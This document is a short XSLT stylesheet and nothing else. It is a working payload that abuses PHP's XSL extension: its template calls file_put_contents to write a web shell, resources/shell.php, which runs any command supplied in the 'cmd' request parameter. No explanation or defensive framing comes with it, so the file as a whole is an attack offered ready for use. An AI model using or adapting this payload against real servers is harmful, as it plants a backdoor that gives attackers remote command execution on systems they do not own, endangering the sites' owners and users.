<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  <xsl:template match="*">
    <html><body><pre>
      <xsl:value-of select="php:function('file_put_contents', './resources/shell.php', '&lt;?php echo shell_exec($_GET[\'cmd\']); ?&gt;')" />
    </pre></body></html>
  </xsl:template>
</xsl:stylesheet>
